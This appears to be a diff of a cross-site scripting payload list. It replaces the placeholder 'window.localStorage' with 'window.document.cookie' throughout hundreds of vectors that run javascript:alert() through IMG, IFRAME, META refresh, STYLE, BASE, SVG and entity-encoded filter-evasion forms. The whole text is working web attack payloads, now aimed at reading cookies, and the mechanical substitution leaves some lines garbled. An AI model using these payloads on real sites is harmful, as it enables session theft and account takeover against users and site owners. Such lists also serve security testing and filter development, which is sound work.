@@ -1,6 +1,6 @@
 
 
-#### window.localStorage Payload List :
+#### window.document.cookie Payload List :
 
 ```
 
@@ -403,7 +403,7 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <BGSOUND SRC="javascript:javascript:alert(1);">
 <BR SIZE="&{javascript:alert(1)}">
 <LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
-<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>window.localStorage
+<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>window.document.cookie
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
 <IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
@@ -411,16 +411,16 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
 <DIV STYLE="background-image: url(javascript:javascript:alert(1))">
 <DIV STYLE="width:expression(javascript:alert(1));">
-<IMG STYLE="window.localStorage:expr/*window.localStorage*/ession(javascript:alert(1))">
-<window.localStorage STYLE="window.localStorage:expression(javascript:alert(1))">
+<IMG STYLE="window.document.cookie:expr/*window.document.cookie*/ession(javascript:alert(1))">
+<window.document.cookie STYLE="window.document.cookie:expression(javascript:alert(1))">
 <STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
-<STYLE>.window.localStorage{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=window.localStorage></A>
+<STYLE>.window.document.cookie{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=window.document.cookie></A>
 <STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
 <!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
 <BASE HREF="javascript:javascript:alert(1);//">
 <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
-<HTML xmlns:window.localStorage><?import namespace="window.localStorage" implementation="%(htc)s"><window.localStorage:window.localStorage>window.localStorage</window.localStorage:window.localStorage></HTML>""","XML namespace."),("""<XML ID="window.localStorage"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#window.localStorage" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
-<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="window.localStorage&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
+<HTML xmlns:window.document.cookie><?import namespace="window.document.cookie" implementation="%(htc)s"><window.document.cookie:window.document.cookie>window.document.cookie</window.document.cookie:window.document.cookie></HTML>""","XML namespace."),("""<XML ID="window.document.cookie"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#window.document.cookie" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="window.document.cookie&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
 <form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
 <body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
 <P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
@@ -437,92 +437,92 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <a href="jav&#65ascript:javascript:alert(1)">test1</a>
 <a href="jav&#97ascript:javascript:alert(1)">test1</a>
 <iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
-<IMG SRC="javascript:alert('window.localStorage');">
-<IMG SRC=javascript:alert('window.localStorage')>
-<IMG SRC=javascript:alert("window.localStorage")>
-<IMG SRC=`javascript:alert("RSnake says, 'window.localStorage'")`>
+<IMG SRC="javascript:alert('window.document.cookie');">
+<IMG SRC=javascript:alert('window.document.cookie')>
+<IMG SRC=javascript:alert("window.document.cookie")>
+<IMG SRC=`javascript:alert("RSnake says, 'window.document.cookie'")`>
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
-<IMG SRC=" &#14;  javascript:alert('window.localStorage');">
-<IMG SRC="javascript:alert('window.localStorage')"
-<INPUT TYPE="IMAGE" SRC="javascript:alert('window.localStorage');">
-<BODY BACKGROUND="javascript:alert('window.localStorage')">
-<IMG DYNSRC="javascript:alert('window.localStorage')">
-<IMG LOWSRC="javascript:alert('window.localStorage')">
-<STYLE>li {list-style-image: url("javascript:alert('window.localStorage')");}</STYLE><UL><LI>window.localStorage</br>
-<BGSOUND SRC="javascript:alert('window.localStorage');">
-<LINK REL="stylesheet" HREF="javascript:alert('window.localStorage');">
-<STYLE>.window.localStorage{background-image:url("javascript:alert('window.localStorage')");}</STYLE><A CLASS=window.localStorage></A>
-<STYLE type="text/css">BODY{background:url("javascript:alert('window.localStorage')")}</STYLE>
-<STYLE type="text/css">BODY{background:url("javascript:alert('window.localStorage')")}</STYLE>
-<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('window.localStorage');">
-<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('window.localStorage');">
-<IFRAME SRC="javascript:alert('window.localStorage');"></IFRAME>
-<FRAMESET><FRAME SRC="javascript:alert('window.localStorage');"></FRAMESET>
-<TABLE BACKGROUND="javascript:alert('window.localStorage')">
-<TABLE><TD BACKGROUND="javascript:alert('window.localStorage')">
-<DIV STYLE="background-image: url(javascript:alert('window.localStorage'))">
-<DIV STYLE="background-image: url(&#1;javascript:alert('window.localStorage'))">
-<BASE HREF="javascript:alert('window.localStorage');//">
+<IMG SRC=" &#14;  javascript:alert('window.document.cookie');">
+<IMG SRC="javascript:alert('window.document.cookie')"
+<INPUT TYPE="IMAGE" SRC="javascript:alert('window.document.cookie');">
+<BODY BACKGROUND="javascript:alert('window.document.cookie')">
+<IMG DYNSRC="javascript:alert('window.document.cookie')">
+<IMG LOWSRC="javascript:alert('window.document.cookie')">
+<STYLE>li {list-style-image: url("javascript:alert('window.document.cookie')");}</STYLE><UL><LI>window.document.cookie</br>
+<BGSOUND SRC="javascript:alert('window.document.cookie');">
+<LINK REL="stylesheet" HREF="javascript:alert('window.document.cookie');">
+<STYLE>.window.document.cookie{background-image:url("javascript:alert('window.document.cookie')");}</STYLE><A CLASS=window.document.cookie></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('window.document.cookie')")}</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:alert('window.document.cookie')")}</STYLE>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('window.document.cookie');">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('window.document.cookie');">
+<IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('window.document.cookie');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('window.document.cookie')">
+<TABLE><TD BACKGROUND="javascript:alert('window.document.cookie')">
+<DIV STYLE="background-image: url(javascript:alert('window.document.cookie'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('window.document.cookie'))">
+<BASE HREF="javascript:alert('window.document.cookie');//">
 <a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
 <marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
-<IMG SRC=”javascript:alert(‘window.localStorage’);”>
-<IMG SRC=javascript:alert(&quot;window.localStorage&quot;)>
-<IMG SRC=javascript:alert(‘window.localStorage’)>      
+<IMG SRC=”javascript:alert(‘window.document.cookie’);”>
+<IMG SRC=javascript:alert(&quot;window.document.cookie&quot;)>
+<IMG SRC=javascript:alert(‘window.document.cookie’)>      
 <a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
 <marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
-<BODY BACKGROUND=”javascript:alert(‘window.localStorage’)”>
-<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘window.localStorage’);”>
-<IMG SRC=”javascript:alert(‘window.localStorage’)”
+<BODY BACKGROUND=”javascript:alert(‘window.document.cookie’)”>
+<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘window.document.cookie’);”>
+<IMG SRC=”javascript:alert(‘window.document.cookie’)”
 javascript:alert("hellox worldss")
-<img src="javascript:alert('window.localStorage');">
-<img src=javascript:alert(&quot;window.localStorage&quot;)>
-<IFRAME SRC="javascript:alert('window.localStorage');"></IFRAME>
-<form><button formaction="javascript:alert(window.localStorage)">lol
-<IMG SRC="javascript:alert('window.localStorage');">
-<IMG SRC=javascript:alert('window.localStorage')>
-<IMG SRC=" &#14;  javascript:alert('window.localStorage');">
-<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('window.localStorage');">
-<IFRAME SRC="javascript:alert('window.localStorage');"></IFRAME>
-<FRAMESET><FRAME SRC="javascript:alert('window.localStorage');"></FRAMESET>
-<TABLE BACKGROUND="javascript:alert('window.localStorage')">
-<TABLE><TD BACKGROUND="javascript:alert('window.localStorage')">
-<DIV STYLE="background-image: url(javascript:alert('window.localStorage'))">
+<img src="javascript:alert('window.document.cookie');">
+<img src=javascript:alert(&quot;window.document.cookie&quot;)>
+<IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>
+<form><button formaction="javascript:alert(window.document.cookie)">lol
+<IMG SRC="javascript:alert('window.document.cookie');">
+<IMG SRC=javascript:alert('window.document.cookie')>
+<IMG SRC=" &#14;  javascript:alert('window.document.cookie');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('window.document.cookie');">
+<IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('window.document.cookie');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('window.document.cookie')">
+<TABLE><TD BACKGROUND="javascript:alert('window.document.cookie')">
+<DIV STYLE="background-image: url(javascript:alert('window.document.cookie'))">
 <form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
 <form><button formaction="javascript:alert(123)">crosssitespt
 <embed src="javascript:alert(1)">
 <svg onload="javascript:alert(123)" xmlns="#"></svg>
 <iframe xmlns="#" src="javascript:alert(1)"></iframe>
-<IMG SRC="javascript:alert('window.localStorage');">
-<IMG SRC=javascript:alert('window.localStorage')>
-<IMG SRC=javascript:alert("window.localStorage")>
-<IMG SRC=`javascript:alert("RSnake says, 'window.localStorage'")`>
+<IMG SRC="javascript:alert('window.document.cookie');">
+<IMG SRC=javascript:alert('window.document.cookie')>
+<IMG SRC=javascript:alert("window.document.cookie")>
+<IMG SRC=`javascript:alert("RSnake says, 'window.document.cookie'")`>
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
-<IMG SRC=" &#14;  javascript:alert('window.localStorage');">
-<IMG SRC="javascript:alert('window.localStorage')"
-<INPUT TYPE="IMAGE" SRC="javascript:alert('window.localStorage');">
-<BODY BACKGROUND="javascript:alert('window.localStorage')">
-<IMG DYNSRC="javascript:alert('window.localStorage')">
-<IMG LOWSRC="javascript:alert('window.localStorage')">
-<STYLE>li {list-style-image: url("javascript:alert('window.localStorage')");}</STYLE><UL><LI>window.localStorage</br>
-<BGSOUND SRC="javascript:alert('window.localStorage');">
-<LINK REL="stylesheet" HREF="javascript:alert('window.localStorage');">
-<STYLE>.window.localStorage{background-image:url("javascript:alert('window.localStorage')");}</STYLE><A CLASS=window.localStorage></A>
-<STYLE type="text/css">BODY{background:url("javascript:alert('window.localStorage')")}</STYLE>
-<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('window.localStorage');">
-<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('window.localStorage');">
-<IFRAME SRC="javascript:alert('window.localStorage');"></IFRAME>
-<FRAMESET><FRAME SRC="javascript:alert('window.localStorage');"></FRAMESET>
-<TABLE BACKGROUND="javascript:alert('window.localStorage')">
-<TABLE><TD BACKGROUND="javascript:alert('window.localStorage')">
-<DIV STYLE="background-image: url(javascript:alert('window.localStorage'))">
-<DIV STYLE="background-image: url(&#1;javascript:alert('window.localStorage'))">
-<BASE HREF="javascript:alert('window.localStorage');//">
+<IMG SRC=" &#14;  javascript:alert('window.document.cookie');">
+<IMG SRC="javascript:alert('window.document.cookie')"
+<INPUT TYPE="IMAGE" SRC="javascript:alert('window.document.cookie');">
+<BODY BACKGROUND="javascript:alert('window.document.cookie')">
+<IMG DYNSRC="javascript:alert('window.document.cookie')">
+<IMG LOWSRC="javascript:alert('window.document.cookie')">
+<STYLE>li {list-style-image: url("javascript:alert('window.document.cookie')");}</STYLE><UL><LI>window.document.cookie</br>
+<BGSOUND SRC="javascript:alert('window.document.cookie');">
+<LINK REL="stylesheet" HREF="javascript:alert('window.document.cookie');">
+<STYLE>.window.document.cookie{background-image:url("javascript:alert('window.document.cookie')");}</STYLE><A CLASS=window.document.cookie></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('window.document.cookie')")}</STYLE>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('window.document.cookie');">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('window.document.cookie');">
+<IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('window.document.cookie');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('window.document.cookie')">
+<TABLE><TD BACKGROUND="javascript:alert('window.document.cookie')">
+<DIV STYLE="background-image: url(javascript:alert('window.document.cookie'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('window.document.cookie'))">
+<BASE HREF="javascript:alert('window.document.cookie');//">
 javascript:alert%281%29;
-"><h1><IFRAME SRC="javascript:alert('window.localStorage');"></IFRAME>">123</h1>
-<IFRAME SRC="javascript:alert('window.localStorage');"></IFRAME>
-"><h1><IFRAME SRC="javascript:alert('window.localStorage');"></IFRAME>">123</h1>
-<IFRAME SRC="javascript:alert('window.localStorage');"></IFRAME>
+"><h1><IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>">123</h1>
+<IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>
+"><h1><IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>">123</h1>
+<IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>
 <a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
 <marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
 <script\x20type="text/javascript">javascript:alert(1);</script>
@@ -936,7 +936,7 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <BGSOUND SRC="javascript:javascript:alert(1);">
 <BR SIZE="&{javascript:alert(1)}">
 <LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
-<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>window.localStorage
+<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>window.document.cookie
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
 <IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
@@ -944,16 +944,16 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
 <DIV STYLE="background-image: url(javascript:javascript:alert(1))">
 <DIV STYLE="width:expression(javascript:alert(1));">
-<IMG STYLE="window.localStorage:expr/*window.localStorage*/ession(javascript:alert(1))">
-<window.localStorage STYLE="window.localStorage:expression(javascript:alert(1))">
+<IMG STYLE="window.document.cookie:expr/*window.document.cookie*/ession(javascript:alert(1))">
+<window.document.cookie STYLE="window.document.cookie:expression(javascript:alert(1))">
 <STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
-<STYLE>.window.localStorage{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=window.localStorage></A>
+<STYLE>.window.document.cookie{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=window.document.cookie></A>
 <STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
 <!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
 <BASE HREF="javascript:javascript:alert(1);//">
 <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
-<HTML xmlns:window.localStorage><?import namespace="window.localStorage" implementation="%(htc)s"><window.localStorage:window.localStorage>window.localStorage</window.localStorage:window.localStorage></HTML>""","XML namespace."),("""<XML ID="window.localStorage"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#window.localStorage" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
-<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="window.localStorage&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
+<HTML xmlns:window.document.cookie><?import namespace="window.document.cookie" implementation="%(htc)s"><window.document.cookie:window.document.cookie>window.document.cookie</window.document.cookie:window.document.cookie></HTML>""","XML namespace."),("""<XML ID="window.document.cookie"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#window.document.cookie" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="window.document.cookie&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
 <form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
 <body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
 <P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
@@ -970,123 +970,123 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <a href="jav&#65ascript:javascript:alert(1)">test1</a>
 <a href="jav&#97ascript:javascript:alert(1)">test1</a>
 <iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
-<IMG SRC="javascript:alert('window.localStorage');">
-<IMG SRC=javascript:alert('window.localStorage')>
-<IMG SRC=javascript:alert("window.localStorage")>
-<IMG SRC=`javascript:alert("RSnake says, 'window.localStorage'")`>
+<IMG SRC="javascript:alert('window.document.cookie');">
+<IMG SRC=javascript:alert('window.document.cookie')>
+<IMG SRC=javascript:alert("window.document.cookie")>
+<IMG SRC=`javascript:alert("RSnake says, 'window.document.cookie'")`>
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
-<IMG SRC=" &#14;  javascript:alert('window.localStorage');">
-<IMG SRC="javascript:alert('window.localStorage')"
-<INPUT TYPE="IMAGE" SRC="javascript:alert('window.localStorage');">
-<BODY BACKGROUND="javascript:alert('window.localStorage')">
-<IMG DYNSRC="javascript:alert('window.localStorage')">
-<IMG LOWSRC="javascript:alert('window.localStorage')">
-<STYLE>li {list-style-image: url("javascript:alert('window.localStorage')");}</STYLE><UL><LI>window.localStorage</br>
-<BGSOUND SRC="javascript:alert('window.localStorage');">
-<LINK REL="stylesheet" HREF="javascript:alert('window.localStorage');">
-<STYLE>.window.localStorage{background-image:url("javascript:alert('window.localStorage')");}</STYLE><A CLASS=window.localStorage></A>
-<STYLE type="text/css">BODY{background:url("javascript:alert('window.localStorage')")}</STYLE>
-<STYLE type="text/css">BODY{background:url("javascript:alert('window.localStorage')")}</STYLE>
-<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('window.localStorage');">
-<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('window.localStorage');">
-<IFRAME SRC="javascript:alert('window.localStorage');"></IFRAME>
-<FRAMESET><FRAME SRC="javascript:alert('window.localStorage');"></FRAMESET>
-<TABLE BACKGROUND="javascript:alert('window.localStorage')">
-<TABLE><TD BACKGROUND="javascript:alert('window.localStorage')">
-<DIV STYLE="background-image: url(javascript:alert('window.localStorage'))">
-<DIV STYLE="background-image: url(&#1;javascript:alert('window.localStorage'))">
-<BASE HREF="javascript:alert('window.localStorage');//">
+<IMG SRC=" &#14;  javascript:alert('window.document.cookie');">
+<IMG SRC="javascript:alert('window.document.cookie')"
+<INPUT TYPE="IMAGE" SRC="javascript:alert('window.document.cookie');">
+<BODY BACKGROUND="javascript:alert('window.document.cookie')">
+<IMG DYNSRC="javascript:alert('window.document.cookie')">
+<IMG LOWSRC="javascript:alert('window.document.cookie')">
+<STYLE>li {list-style-image: url("javascript:alert('window.document.cookie')");}</STYLE><UL><LI>window.document.cookie</br>
+<BGSOUND SRC="javascript:alert('window.document.cookie');">
+<LINK REL="stylesheet" HREF="javascript:alert('window.document.cookie');">
+<STYLE>.window.document.cookie{background-image:url("javascript:alert('window.document.cookie')");}</STYLE><A CLASS=window.document.cookie></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('window.document.cookie')")}</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:alert('window.document.cookie')")}</STYLE>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('window.document.cookie');">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('window.document.cookie');">
+<IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('window.document.cookie');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('window.document.cookie')">
+<TABLE><TD BACKGROUND="javascript:alert('window.document.cookie')">
+<DIV STYLE="background-image: url(javascript:alert('window.document.cookie'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('window.document.cookie'))">
+<BASE HREF="javascript:alert('window.document.cookie');//">
 <a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
 <marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
-<IMG SRC="javascript:alert('window.localStorage');">
-<IMG SRC=javascript:alert('window.localStorage')>
-<IMG SRC=javascript:alert('window.localStorage')>
-<IMG SRC=javascript:alert(&quot;window.localStorage&quot;)>
+<IMG SRC="javascript:alert('window.document.cookie');">
+<IMG SRC=javascript:alert('window.document.cookie')>
+<IMG SRC=javascript:alert('window.document.cookie')>
+<IMG SRC=javascript:alert(&quot;window.document.cookie&quot;)>
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
-<IMG LOWSRC=\"javascript:alert('window.localStorage')\">
-<IMG DYNSRC=\"javascript:alert('window.localStorage')\">
-<img src="javascript:alert('window.localStorage')">
-<body onunload="javascript:alert('window.localStorage');">
-<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('window.localStorage');\">
-<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('window.localStorage');\">
-<STYLE type="text/css">BODY{background:url("javascript:alert('window.localStorage')")}</STYLE>
-<FRAMESET><FRAME SRC=\"javascript:alert('window.localStorage');\"></FRAMESET>
-<STYLE>li {list-style-image: url(\"javascript:alert('window.localStorage')\");}</STYLE><UL><LI>window.localStorage
-<BASE HREF="javascript:alert('window.localStorage');//">
-<INPUT TYPE="IMAGE" SRC="javascript:alert('window.localStorage');">
-<iframe src="javascript:alert('window.localStorage by \nwindow.localStorage');"></iframe><marquee><h1>window.localStorage by window.localStorage</h1></marquee>
-<BODY BACKGROUND="javascript:alert('window.localStorage')">
-<IMG SRC="javascript:alert('window.localStorage');">
-<IMG DYNSRC="javascript:alert('window.localStorage')">
-<IMG LOWSRC="javascript:alert('window.localStorage')">
-<INPUT TYPE="IMAGE" SRC="javascript:alert('window.localStorage');">
-<LINK REL="stylesheet" HREF="javascript:alert('window.localStorage');">
-<TABLE BACKGROUND="javascript:alert('window.localStorage')">
-<TD BACKGROUND="javascript:alert('window.localStorage')">
-<DIV STYLE="background-image: url(javascript:alert('window.localStorage'))">
-&lt;BASE HREF=&quot;javascript:alert(&apos;window.localStorage&apos;);//&quot;&gt;
-&lt;BGSOUND SRC=&quot;javascript:alert(&apos;window.localStorage&apos;);&quot;&gt;
-&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;window.localStorage&apos;);&quot;&gt;
-&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;window.localStorage&apos;))&quot;&gt;
-&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;window.localStorage&apos;))&quot;&gt;
-&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;window.localStorage&apos;);&quot;&gt;&lt;/FRAMESET&gt;
-&lt;IFRAME SRC=&quot;javascript:alert(&apos;window.localStorage&apos;);&quot;&gt;&lt;/IFRAME&gt;
-&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;window.localStorage&apos;);&quot;&gt;
-&lt;IMG SRC=&quot;javascript:alert(&apos;window.localStorage&apos;);&quot;&gt;
-&lt;IMG SRC=javascript:alert(&apos;window.localStorage&apos;)&gt;
-&lt;IMG DYNSRC=&quot;javascript:alert(&apos;window.localStorage&apos;);&quot;&gt;
-&lt;IMG LOWSRC=&quot;javascript:alert(&apos;window.localStorage&apos;);&quot;&gt;
-&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;window.localStorage&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;window.localStorage
-&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;window.localStorage&apos;);&quot;&gt;
-&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;window.localStorage&apos;);&quot;&gt;
-&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;window.localStorage&apos;)&gt;&lt;/OBJECT&gt;
-&lt;STYLE&gt;.window.localStorage{background-image:url(&quot;javascript:alert(&apos;window.localStorage&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=window.localStorage&gt;&lt;/A&gt;
-&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;window.localStorage&apos;)&quot;)}&lt;/STYLE&gt;
-&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;window.localStorage&apos;);&quot;&gt;
-&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;window.localStorage&apos;)&quot;&gt;&lt;/TABLE&gt;
-&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;window.localStorage&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;
-&lt;IMG SRC=javascript:alert(&amp;quot;window.localStorage&amp;quot;)&gt;
-&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;window.localStorage&apos;&quot;)`&gt;
+<IMG LOWSRC=\"javascript:alert('window.document.cookie')\">
+<IMG DYNSRC=\"javascript:alert('window.document.cookie')\">
+<img src="javascript:alert('window.document.cookie')">
+<body onunload="javascript:alert('window.document.cookie');">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('window.document.cookie');\">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('window.document.cookie');\">
+<STYLE type="text/css">BODY{background:url("javascript:alert('window.document.cookie')")}</STYLE>
+<FRAMESET><FRAME SRC=\"javascript:alert('window.document.cookie');\"></FRAMESET>
+<STYLE>li {list-style-image: url(\"javascript:alert('window.document.cookie')\");}</STYLE><UL><LI>window.document.cookie
+<BASE HREF="javascript:alert('window.document.cookie');//">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('window.document.cookie');">
+<iframe src="javascript:alert('window.document.cookie by \nwindow.document.cookie');"></iframe><marquee><h1>window.document.cookie by window.document.cookie</h1></marquee>
+<BODY BACKGROUND="javascript:alert('window.document.cookie')">
+<IMG SRC="javascript:alert('window.document.cookie');">
+<IMG DYNSRC="javascript:alert('window.document.cookie')">
+<IMG LOWSRC="javascript:alert('window.document.cookie')">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('window.document.cookie');">
+<LINK REL="stylesheet" HREF="javascript:alert('window.document.cookie');">
+<TABLE BACKGROUND="javascript:alert('window.document.cookie')">
+<TD BACKGROUND="javascript:alert('window.document.cookie')">
+<DIV STYLE="background-image: url(javascript:alert('window.document.cookie'))">
+&lt;BASE HREF=&quot;javascript:alert(&apos;window.document.cookie&apos;);//&quot;&gt;
